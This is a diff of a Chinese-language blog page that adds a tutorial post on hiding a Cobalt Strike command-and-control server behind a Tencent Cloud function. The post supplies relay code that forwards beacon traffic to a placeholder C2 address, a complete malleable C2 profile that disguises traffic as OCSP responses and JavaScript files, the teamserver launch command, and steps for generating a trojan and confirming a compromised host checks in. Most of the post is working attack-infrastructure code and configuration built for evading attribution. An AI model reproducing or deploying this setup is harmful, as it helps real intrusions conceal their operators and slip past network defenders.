@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Lower</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Lower">
+  <title>使用云函数隐藏真实的Cobalt Strike ip地址 | Lower</title>
+  <meta name="keywords" content=" 软件技巧 , 渗透测试 , Cobalt Strike ">
+  <meta name="description" content="使用云函数隐藏真实的Cobalt Strike ip地址 | Lower">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="使用云函数隐藏真实ip文章使用腾讯云，其他的类似 直接搜索云函数，如果第一次使用可能会提示需要授权，根据提示进行授权即可点击新建云函数，使用自定义创建，选择实践函数，名称自定义，地域选离你近的，运行环境python3.6，代码部署 函数代码默认配置即可，云函数代码如下，记得修改下自己的c2ip： # -*- coding: utf8 -*- import json,base64,requests">
 <meta property="og:type" content="article">
@@ -70,7 +70,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -390,12 +390,55 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-使用腾讯云隐藏真实的Cobalt-Strike-ip地址" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELower"><span class="toc-text">关于Lower</span></a></li></ol>
+        <h1 class="article-title">使用云函数隐藏真实的Cobalt Strike ip地址</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="工具">工具</a> > 
+            
+            <a  data-rel="工具&lt;---&gt;Cobalt Strike">Cobalt Strike</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">软件技巧</a>
+            
+            <a class="color5">渗透测试</a>
+            
+            <a class="color4">Cobalt Strike</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2021-11-05 17:48:45'>2021-11-05 17:39</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:741</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9Eip"><span class="toc-text">使用云函数隐藏真实ip</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -408,25 +451,115 @@
     }
 </style>
 </div>
-            <h2 id="关于Lower"><a href="#关于Lower" class="headerlink" title="关于Lower"></a>关于Lower</h2><center>世事无常，降低期望，保持专注</center>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="使用云函数隐藏真实ip"><a href="#使用云函数隐藏真实ip" class="headerlink" title="使用云函数隐藏真实ip"></a>使用云函数隐藏真实ip</h1><p>文章使用腾讯云，其他的类似</p>
+<p>直接搜索云函数，如果第一次使用可能会提示需要授权，根据提示进行授权即可<br>点击新建云函数，使用自定义创建，选择实践函数，名称自定义，地域选离你近的，运行环境python3.6，代码部署<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636099807405.png" alt="自定义创建云函数"></p>
+<p>函数代码默认配置即可，云函数代码如下，记得修改下自己的c2ip：</p>
+<pre><code class="python"># -*- coding: utf8 -*-
+import json,base64,requests
+def main_handler(event,context):
+    C2 = &#39;http://IP:PORT&#39;
+    headers = event[&#39;headers&#39;]
+    path = event[&#39;path&#39;]
+    ip = event[&#39;requestContext&#39;][&#39;sourceIp&#39;]
+    headers = event[&#39;headers&#39;]
+    headers[&#39;X-Forwarded-For&#39;] = ip
+    print(event)
+    if event[&#39;httpMethod&#39;] == &#39;GET&#39;:
+        resp = requests.get(C2+path,headers=headers,verify=False)
+    else:
+        resp = requests.post(C2+path,data=event[&#39;body&#39;],headers=headers,verify=False)
+        print(resp.headers)
+        print(resp.content)
 
-<p><strong>Lower</strong> 是博主（莫名的Low）的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<p>使用技巧：</p>
-<ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a target="_blank" rel="noopener" href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
-</ul>
+    response=&#123;
+        &quot;isBase64Encoded&quot;:True,
+        &quot;statusCode&quot;:resp.status_code,
+        &quot;headers&quot;:dict(resp.headers),
+        &quot;body&quot;:str(base64.b64encode(resp.content))[2:-1]
+    &#125;
+    return response
+</code></pre>
+<p>高级设置不用动，点击触发器设置，版本选择一下，触发方式选择<code>API网关触发</code>，选择了之后点击完成开始创建云函数<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636100074106.png" alt="云函数的触发器配置"><br>创建完成呢之后我们点击编辑API<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636100369245.png" alt="编辑云函数"><br>注意路径一定要是根目录，将原来的给删除，然后点击立即完成发布服务<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636100477942.png" alt="云函数的路径配置"><br>发布完服务之后点击名称，在右侧就可以看到两个默认访问地址，一个是http的，一个是https的，后续根据Cobalt Strike的监听服务进行选择即可。<br>接着在服务端的Cobalt Strike中新建<code>tencent.profile</code>文件，其内容如下</p>
+<pre><code class="profile">set sample_name &quot;t&quot;;
+set sleeptime &quot;3000&quot;;
+set jitter &quot;0&quot;;
+set maxdns &quot;255&quot;;
+set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+http-get &#123; 
+    set uri &quot;/api/x&quot;; 
+    client &#123; header &quot;Accept&quot; &quot;*/*&quot;; 
+    metadata &#123; 
+        base64; 
+        prepend &quot;SESSIONID=&quot;; 
+        header &quot;Cookie&quot;; 
+        &#125;
+    &#125;
+server &#123; 
+    header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;
+    header &quot;content-transfer-encoding&quot; &quot;binary&quot;;
+    header &quot;Server&quot; &quot;Nodejs&quot;;
+    output &#123; 
+        base64; 
+        print; 
+        &#125;
+    &#125;
+&#125;
+http-stager &#123;
+    set uri_x86 &quot;/vue.min.js&quot;;
+    set uri_x64 &quot;/bootstrap-2.min.js&quot;;
+&#125;
+
+http-post &#123; 
+    set uri &quot;/api/y&quot;; 
+    client &#123; 
+        header &quot;Accept&quot; &quot;*/*&quot;; 
+        id &#123;
+            base64; 
+            prepend &quot;JSESSION=&quot;; 
+            header &quot;Cookie&quot;; 
+            &#125;
+        output &#123;
+            base64; 
+            print; 
+            &#125;
+        &#125;
+    server &#123; 
+        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;; 
+        header &quot;content-transfer-encoding&quot; &quot;binary&quot;; 
+        header &quot;Connection&quot; &quot;keep-alive&quot;; 
+        output &#123; 
+            base64; 
+            print; 
+            &#125;
+        &#125;
+&#125;
+</code></pre>
+<p>开启Cobalt Strike服务端<code>./teamserver ip password tencent.profile </code><br>本地连接Cobal Strike，新添加个监听，将腾讯云函数的默认访问地址复制过来，复制的时候注意掐头去尾，不要<code>http://</code>，不要<code>:80</code><br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636102562352.png" alt="注意云函数的默认地址要掐头去尾"><br>设置Cobalt Strike的监听<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636102446645.png" alt="设置Cobalt Strike的监听"><br>接下来测试效果，先用Cobalt Strike生成一个木马，注意监听选择我们的腾讯云<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636103019191.png" alt="生成木马"><br>测试效果，成功上线主机<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636102999607.png" alt="Cobalt Strike上线主机"><br>查看网络通信，发现木马外联地址是<code>140.143.115.153</code>，该ip是腾讯公司的的ip地址，成功隐藏了我们的真实ip<br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636103193342.png" alt="木马外连地址非Cobalt Strike主机地址"><br><img src="https://image-server-1302471292.cos.ap-chengdu.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1636103626598.png" alt="木马外连地址是腾讯云的"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 ohpsehgi@gmail.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -435,11 +568,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
